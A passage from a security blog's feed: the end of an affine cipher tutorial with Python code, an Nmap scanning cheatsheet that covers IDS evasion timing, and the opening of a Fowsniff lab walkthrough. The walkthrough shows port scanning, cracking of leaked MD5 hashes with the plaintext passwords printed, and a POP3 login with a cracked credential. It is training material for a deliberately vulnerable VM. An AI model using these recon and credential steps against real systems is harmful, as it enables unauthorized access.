style="text-align:center">2</td><td style="text-align:center">17</td><td style="text-align:center">4</td><td style="text-align:center">19</td></tr></tbody></table><p><strong>Encrypting the letters:</strong></p><center><br><code>5 * 18 + 7 mod 26 = 19</code><br><code>5 * 4 + 7 mod 26 = 1</code><br><code>5 * 2 + 7 mod 26 = 17</code><br><code>5 * 17 + 7 mod 26 = 14</code><br><code>5 * 4 + 7 mod 26 = 1</code><br><code>5 * 19 + 7 mod 26 = 24</code><br> </center><p><strong>Encrypted message:</strong></p><table><thead><tr><th style="text-align:center">19</th><th style="text-align:center">1</th><th style="text-align:center">17</th><th style="text-align:center">14</th><th style="text-align:center">1</th><th style="text-align:center">24</th></tr></thead><tbody><tr><td style="text-align:center">t</td><td style="text-align:center">b</td><td style="text-align:center">r</td><td style="text-align:center">o</td><td style="text-align:center">b</td><td style="text-align:center">y</td></tr></tbody></table><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><p>The encrypt method takes 2 parameters, a coefficients list which will have 2 elements and a message. I created 2 variable for the 2 coefficient and started iterating through the plain message letter by letter. I ignored every letter that is not in the alphabet and simply continued the loop.</p><p>Next, I created a new <code>index</code> variable to store the current letter index. For better readability, I decided to store the result of the formula (the encrypted letter index) in a new variable.</p><p>Finally, I appended that specific letter from the alphabet to the <code>encrypted_message</code> variable.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(coefficients, message)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line">    encrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    coefficient_a = coefficients[<span class="number">0</span>]</span><br><span class="line">    coefficient_b = coefficients[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        index = ALPHABET.find(char)</span><br><span class="line">        encrypted_char_index = (coefficient_a * index + coefficient_b) % len(ALPHABET)</span><br><span class="line">        encrypted_message += ALPHABET[encrypted_char_index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_message</span><br></pre></td></tr></table></figure><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><p>As for the decryption, the procedure is a little different. The decryption formula is <code>a^-1 (x - b) mod 26</code>. For this to work, we have to find the modular multiplicative inverse of <code>a</code>. The modular multiplicative inverse of an integer <code>a</code> is an integer <code>x</code> such that the product <code>a * x</code> is congruent to 1 with respect to the modulus <code>m</code>. The multiplicative inverse of <code>a</code> only exists if <code>a</code> and <code>m</code> are coprime. Hence without the restriction on <code>a</code>, decryption might not be possible.</p><p>I started a loop, which iterates through the length of the alphabet. If <code>a * i % 26</code> equals to 1, then we found our multiplicative inverse and we can continue with the next loop. In the second loop, I calculated the <code>decrypted_char_index</code> by substituting into the formula and at the end, I appended the decrypted letter to the <code>decrypted_message</code> variable.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(coefficients, message)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line">    decrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    coefficient_a = coefficients[<span class="number">0</span>]</span><br><span class="line">    coefficient_b = coefficients[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    multiplicative_inverse = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ALPHABET)):</span><br><span class="line">        <span class="keyword">if</span> coefficient_a * i % len(ALPHABET) == <span class="number">1</span>:</span><br><span class="line">            multiplicative_inverse = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multiplicative_inverse <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Sorry, the decryption is not possible!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        index = ALPHABET.find(char)</span><br><span class="line">        decrypted_char_index = (multiplicative_inverse * (index - coefficient_b)) % len(ALPHABET)</span><br><span class="line">        decrypted_message += ALPHABET[decrypted_char_index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br></pre></td></tr></table></figure><div class="addthis_tipjar_inline"></div><h2 id="The-full-source-code"><a href="#The-full-source-code" class="headerlink" title="The full source code"></a>The full source code</h2><p>I created a command line program so that you can try and test this whole thing out. Actually, I just added some command line arguments. Anyway, I hope you like it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(coefficients, message)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line">    encrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    coefficient_a = coefficients[<span class="number">0</span>]</span><br><span class="line">    coefficient_b = coefficients[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            message = message.replace(char, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        index = ALPHABET.find(char)</span><br><span class="line">        encrypted_char_index = (coefficient_a * index + coefficient_b) % len(ALPHABET)</span><br><span class="line">        encrypted_message += ALPHABET[encrypted_char_index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(coefficients, message)</span>:</span></span><br><span class="line">    message = message.upper()</span><br><span class="line">    decrypted_message = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    coefficient_a = coefficients[<span class="number">0</span>]</span><br><span class="line">    coefficient_b = coefficients[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    multiplicative_inverse = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ALPHABET)):</span><br><span class="line">        <span class="keyword">if</span> coefficient_a * i % len(ALPHABET) == <span class="number">1</span>:</span><br><span class="line">            multiplicative_inverse = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multiplicative_inverse <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Sorry, the decryption is not possible!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> ALPHABET:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        index = ALPHABET.find(char)</span><br><span class="line">        decrypted_char_index = (multiplicative_inverse * (index - coefficient_b)) % len(ALPHABET)</span><br><span class="line">        decrypted_message += ALPHABET[decrypted_char_index]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage = <span class="string">"python affine_cipher.py -e -m secret -c 5 7\nor\n"</span> \</span><br><span class="line">            <span class="string">"python affine_cipher.py -d -m tbroby -c 5 7"</span></span><br><span class="line"></span><br><span class="line">    description = <span class="string">"Command line program for demonstrating the Affine cipher."</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(usage=usage, description=description)</span><br><span class="line">    parser.add_argument(<span class="string">"-v"</span>, <span class="string">"--version"</span>, action=<span class="string">"version"</span>, version=<span class="string">"%(affine_cipher)s 1.0"</span>)</span><br><span class="line"></span><br><span class="line">    group = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">"-e"</span>, <span class="string">"--encrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"encrypt"</span>,</span><br><span class="line">                       help=<span class="string">"Encrypts the plain text message."</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">"-d"</span>, <span class="string">"--decrypt"</span>, action=<span class="string">"store_true"</span>, dest=<span class="string">"decrypt"</span>,</span><br><span class="line">                       help=<span class="string">"Decrypts the encrypted message."</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-m"</span>, <span class="string">"--message"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, dest=<span class="string">"message"</span>,</span><br><span class="line">                        help=<span class="string">"You need to specify the message. Like this: -m \"secret\""</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--coefficients"</span>, action=<span class="string">"store"</span>, required=<span class="literal">True</span>, type=int,</span><br><span class="line">                        nargs=<span class="number">2</span>, dest=<span class="string">"coefficients"</span>, help=<span class="string">"You need to specify the keys."</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.encrypt:</span><br><span class="line">        print(<span class="string">"The encrypted message is: "</span> + encrypt(options.coefficients, options.message))</span><br><span class="line">    <span class="keyword">elif</span> options.decrypt:</span><br><span class="line">        print(<span class="string">"The decrypted message is: "</span> + decrypt(options.coefficients, options.message))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><center>Feel free to download and experiment with the code,<br> it’s the best way to learn new things!</center><center>- - - - - - - - - -</center><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cryptography </tag>
            
            <tag> cipher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap Cheatsheet</title>
      <link href="/2018/12/12/Nmap-Cheatsheet/"/>
      <url>/2018/12/12/Nmap-Cheatsheet/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="nmap_cheatsheet.png" alt></p><h1 id="About-Nmap"><a href="#About-Nmap" class="headerlink" title="About Nmap"></a>About Nmap</h1><blockquote><p>Nmap is used for network discovery and security auditing. In short, nmap displays exposed services on a target machine along with other useful information such as the version and OS detection. It’s also open-source!</p></blockquote><h2 id="TCP-Connect"><a href="#TCP-Connect" class="headerlink" title="TCP Connect"></a>TCP Connect</h2><p>TCP Connect scan completes the 3-way handshake. If a port is open, the operating system completed the TCP three-way handshake and the port scanner immediately closes the connection to avoid DOS. This is “noisy” because the services can log the sender IP address and might trigger Intrusion Detection Systems.</p><h2 id="UDP-Scan"><a href="#UDP-Scan" class="headerlink" title="UDP Scan"></a>UDP Scan</h2><p>This scan checks to see if there are any UDP ports listening. Since UDP does not respond with a positive acknowledgment like TCP and only responds to an incoming UDP packet when the port is closed, this type of scan can sometimes show false positives. However, it can also reveal Trojan horses running on high UDP ports and hidden RPC services. It may be quite slow since some machines intentionally slow down responses to this kind of traffic to avoid being overwhelmed. Machines running Windows OS, however, do not implement this slowdown feature, so you should be able to use UDP to scan Windows hosts normally.</p><h2 id="SYN-Scan"><a href="#SYN-Scan" class="headerlink" title="SYN Scan"></a>SYN Scan</h2><p>SYN scan is another form of TCP scanning. Rather than using the operating system’s network functions, the port scanner generates raw IP packets itself, and monitors for responses. This scan type is also known as “half-open scanning” because it never actually opens a full TCP connection. The port scanner generates an SYN packet. If the target port is open, it will respond with an SYN-ACK packet. The scanner host responds with an RST packet, closing the connection before the handshake is completed. If the port is closed but unfiltered, the target will instantly respond with an RST packet. There is debate over which scan is less intrusive on the target host. SYN scan has the advantage that the individual services never actually receive a connection.</p><h2 id="FIN-Scan"><a href="#FIN-Scan" class="headerlink" title="FIN Scan"></a>FIN Scan</h2><p>This is a stealthy scan, like the SYN scan, but sends a TCP FIN packet instead. Most but not all computers will send an RST packet back if they get this input, so the FIN scan can show false positives and negatives, but it may get under the radar of some IDS programs and other countermeasures.</p><h2 id="ACK-Scan"><a href="#ACK-Scan" class="headerlink" title="ACK Scan"></a>ACK Scan</h2><p>Ack scanning determines whether the port is filtered or not. This is especially good when attempting to probe for the existence of a firewall and its rulesets. Simple packet filtering will allow established connections (packets with the ACK bit set), whereas a more sophisticated stateful firewall might not.</p><h2 id="NULL-Scan"><a href="#NULL-Scan" class="headerlink" title="NULL Scan"></a>NULL Scan</h2><p>Another very stealthy scan that sets all the TCP header flags to off or null. This is not normally a valid packet and some hosts will not know what to do with this. Windows operating systems are in this group, and scanning them with NULL scans will produce unreliable results. However, for non-Windows servers protected by a firewall, this can be a way to get through.</p><h2 id="XMAS-Scan"><a href="#XMAS-Scan" class="headerlink" title="XMAS Scan"></a>XMAS Scan</h2><p>Similar to the NULL scan except for all the flags in the TCP header is set to on. Windows machines won’t respond to this due to the way their TCP stack is implemented. Xmas scans derive their name from the set of flags that are turned on within a packet. These scans are designed to manipulate the PSH, URG and FIN flags of the TCP header.</p><h2 id="RPC-Scan"><a href="#RPC-Scan" class="headerlink" title="RPC Scan"></a>RPC Scan</h2><p>This special type of scan looks for machines answering to RPC (Remote Procedure Call) services. RPC, which allows remote commands to be run on the machine under certain conditions, can be a dangerous service. Since RPC services can run on many different ports, it is hard to tell from a normal scan which ones might be running RPC. This scan will probe the ports found open on a machine with commands to show the program name and version if RPC is running. It’s not a bad idea to run one of these scans every so often just to find out if and where you have these services running.</p><h2 id="IDLE-Scan"><a href="#IDLE-Scan" class="headerlink" title="IDLE Scan"></a>IDLE Scan</h2><p>It is a super stealthy method whereby the scan packets are bounced off an external host. You don’t need to have control over the other host but it does have to set up and meet certain requirements. You must input the IP address of our “zombie” host and what port number to use. It is one of the more controversial options in Nmap since it really only has a use for malicious attacks.</p><div class="addthis_tipjar_inline"></div><center>- - - - - - - - - -</center><h2 id="Scan-Techniques"><a href="#Scan-Techniques" class="headerlink" title="Scan Techniques"></a>Scan Techniques</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-sS</td><td style="text-align:center">TCP SYN port scan.</td><td style="text-align:center">nmap -sS 192.168.1.1</td></tr><tr><td style="text-align:center">-sT</td><td style="text-align:center">TCP Connect port scan.</td><td style="text-align:center">nmap -sT 192.168.1.1</td></tr><tr><td style="text-align:center">-sU</td><td style="text-align:center">UDP port scan.</td><td style="text-align:center">nmap -sU 192.168.1.1</td></tr><tr><td style="text-align:center">-sA</td><td style="text-align:center">TCP ACK port scan.</td><td style="text-align:center">nmap -sA 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-Pn</td><td style="text-align:center">Only port scan.</td><td style="text-align:center">nmap -Pn 192.168.1.1</td></tr><tr><td style="text-align:center">-sn</td><td style="text-align:center">Only host discovery.</td><td style="text-align:center">nmap -sn 192.168.1.1</td></tr><tr><td style="text-align:center">-PR</td><td style="text-align:center">ARP discovery on local network.</td><td style="text-align:center">nmap -PR 192.168.1.1</td></tr><tr><td style="text-align:center">-n</td><td style="text-align:center">Disable DNS resolution.</td><td style="text-align:center">nmap -n 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="Port-Specification"><a href="#Port-Specification" class="headerlink" title="Port Specification"></a>Port Specification</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-p</td><td style="text-align:center">Port or port range.</td><td style="text-align:center">nmap -p 22-80 192.168.1.1</td></tr><tr><td style="text-align:center">-p-</td><td style="text-align:center">Scan all ports.</td><td style="text-align:center">nmap -p- 192.168.1.1</td></tr><tr><td style="text-align:center">-F</td><td style="text-align:center">Fast port scan. (top 100)</td><td style="text-align:center">nmap -F 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="Service-and-Version-Detection"><a href="#Service-and-Version-Detection" class="headerlink" title="Service and Version Detection"></a>Service and Version Detection</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-sV</td><td style="text-align:center">Detect the version of services.</td><td style="text-align:center">nmap -sV 192.168.1.1</td></tr><tr><td style="text-align:center">-A</td><td style="text-align:center">Enable OS detection, version detection, script scanning and trace route.</td><td style="text-align:center">nmap -A 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="OS-Detection"><a href="#OS-Detection" class="headerlink" title="OS Detection"></a>OS Detection</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-O</td><td style="text-align:center">Identify OS using TCP/IP strack fingerprinting.</td><td style="text-align:center">nmap -O 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="Timing-and-Performance"><a href="#Timing-and-Performance" class="headerlink" title="Timing and Performance"></a>Timing and Performance</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-T0</td><td style="text-align:center">Paranoid IDS evasion.</td><td style="text-align:center">nmap -T0 192.168.1.1</td></tr><tr><td style="text-align:center">-T1</td><td style="text-align:center">Sneaky IDS evasion.</td><td style="text-align:center">nmap -T1 192.168.1.1</td></tr><tr><td style="text-align:center">-T2</td><td style="text-align:center">Polite IDS evasion. (requires less bandwidth)</td><td style="text-align:center">nmap -T2 192.168.1.1</td></tr><tr><td style="text-align:center">-T3</td><td style="text-align:center">Normal IDS evasion. (default)</td><td style="text-align:center">nmap -T3 192.168.1.1</td></tr><tr><td style="text-align:center">-T4</td><td style="text-align:center">Aggressive speed scan. (requires fast network)</td><td style="text-align:center">nmap -T4 192.168.1.1</td></tr><tr><td style="text-align:center">-T5</td><td style="text-align:center">Insane speed scan. (requires massive network speed)</td><td style="text-align:center">nmap -T5 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="NSE-Scripts"><a href="#NSE-Scripts" class="headerlink" title="NSE Scripts"></a>NSE Scripts</h2><table><thead><tr><th style="text-align:center">Switch</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">-sC</td><td style="text-align:center">Default script scan.</td><td style="text-align:center">nmap -sC 192.168.1.1</td></tr><tr><td style="text-align:center">–script banner</td><td style="text-align:center">Specify single script. (banner grabbing)</td><td style="text-align:center">nmap –script banner 192.168.1.1</td></tr></tbody></table><p><br><center>- - - - - - - - - -</center></p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration testing </tag>
            
            <tag> cheatsheet </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fowsniff Walkthrough</title>
      <link href="/2018/12/09/Fowsniff-Walkthrough/"/>
      <url>/2018/12/09/Fowsniff-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="fowsniff_walkthrough.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>I created this boot2root last year to be hosted on Peerlyst.com. It’s beginner level, but requires more than just an exploitdb search or metasploit to run.<br>It was created in (and is intended to be used with) VirtualBox, and takes some extra configuration to set up in VMWare.<br>Download it from here: <a href="https://www.vulnhub.com/entry/fowsniff-1,262/" target="_blank" rel="noopener">Fowsniff on Vulnhub</a></p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><p>The nmap port scan resulted in the following output:</p><pre><code>root@kali:~/Downloads# nmap -A -sC -p- 192.168.43.90Nmap scan report for fowsniff (192.168.43.90)Host is up (0.00052s latency).Not shown: 65531 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry| http-server-header: Apache/2.4.18 (Ubuntu)| http-title: Fowsniff Corp - Delivering Solutions110/tcp open  pop3    Dovecot pop3d| pop3-capabilities: CAPA RESP-CODES USER TOP SASL(PLAIN) PIPELINING AUTH-RESP-CODE UIDL143/tcp open  imap    Dovecot imapd| imap-capabilities: capabilities IMAP4rev1 listed more LOGIN-REFERRALS OKhave ENABLE post-login ID SASL-IR IDLE Pre-login AUTH=PLAINA0001 LITERAL+MAC Address: 08:00:27:66:85:17 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.52 ms fowsniff (192.168.43.90)</code></pre><p>First of all, I went to examine the web server. It was a single page with a notification that the website is out of service, because the corporation has been hacked.</p><blockquote><p>The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.</p></blockquote><h2 id="Finding-the-hashes"><a href="#Finding-the-hashes" class="headerlink" title="Finding the hashes"></a>Finding the hashes</h2><p>A quick search on Twitter revealed the hacked Fowsniff account. One of the tweets contained a pastebin link to the dumped hashes. Here is what the file contained:</p><pre><code>FOWSNIFF CORP PASSWORD LEAK            &apos;&apos;~``           ( o o )+-----.oooO--(_)--Oooo.------+|                            ||          FOWSNIFF          ||            got             ||           PWN3D!!!         ||                            |         |       .oooO                |         |        (   )   Oooo.       |         +---------\ (----(   )-------+           \_)    ) /                 (_/FowSniff Corp got pwn3d by B1gN1nj4!No one is safe from my 1337 skillz!mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56tegel@fowsniff:1dc352435fecca338acfd4be10984009baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bbseina@fowsniff:90dc16d47114aa13671c697fd506cf26stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabdmursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3bparede@fowsniff:4d6e42f56e127803285a0a7649b5ab11sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7eFowsniff Corporation Passwords LEAKED!FOWSNIFF CORP PASSWORD DUMP!Here are their email passwords dumped from their databases.They left their pop3 server WIDE OPEN, too!MD5 is insecure, so you shouldn&apos;t have trouble cracking them but I was too lazy haha =Pl8r n00bz!B1gN1nj4</code></pre><h2 id="Cracking-the-hashes"><a href="#Cracking-the-hashes" class="headerlink" title="Cracking the hashes"></a>Cracking the hashes</h2><p>I copied the MD5 hashes to a separate file and used john to crack them, but it was only able to crack 6 of them.</p><pre><code>root@kali:~/Downloads# john --format=RAW-MD5 dump.txtUsing default input encoding: UTF-8Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])Press &apos;q&apos; or Ctrl-C to abort, almost any other key for statusscoobydoo2       (seina@fowsniff)apples01         (tegel@fowsniff)bilbo101         (mustikka@fowsniff)skyler22         (baksteen@fowsniff)07011972         (sciana@fowsniff)mailcall         (mauer@fowsniff)</code></pre><p>I thought, I should try an online cracker like hashkiller.co.uk. The result was a little better, only one password is missing, but that’s fine for me.</p><pre><code>8a28a94a588a95b80163709ab4313aa4 MD5 : mailcallae1644dac5b77c0cf51e0d26ad6d7e56 MD5 : bilbo1011dc352435fecca338acfd4be10984009 MD5 : apples0119f5af754c31f1e2651edde9250d69bb MD5 : skyler2290dc16d47114aa13671c697fd506cf26 MD5 : scoobydoo2a92b8a29ef1183192e3d35187e0cfabd [Not found]0e9588cb62f4b6f27e33d449e2ba0b3b MD5 : carp4ever4d6e42f56e127803285a0a7649b5ab11 MD5 : orlando12f7fd98d380735e859f8b2ffbbede5a7e MD5 : 07011972</code></pre><h2 id="The-mail-service"><a href="#The-mail-service" class="headerlink" title="The mail service"></a>The mail service</h2><p>It was time to make use of these credentials and log in. I telnetted into the machine on port 110, which is the pop3 service. I could have used a metasploit module, but I was willing to try all of them manually. I got lucky with user <code>seina</code>.</p><pre><code>root@kali:~# telnet 192.168.43.90 110Trying 192.168.43.90...Connected to 192.168.43.90.Escape character is &apos;^]&apos;.+OK Welcome to the Fowsniff Corporate Mail Server!USER seina+OKPASS scoobydoo2+OK Logged in.list+OK 2 messages:1 16222 1280</code></pre><p>As it turns out, the account has 2 messages, so let’s read them.</p><h2 id="Reading-the-emails"><a href="#Reading-the-emails" class="headerlink" title="Reading the emails"></a>Reading the emails</h2><p>Here is the first one:</p><pre><code>retr 1+OK 1622 octetsReturn-Path: &lt;stone@fowsniff&gt;X-Original-To: seina@fowsniffDelivered-To: 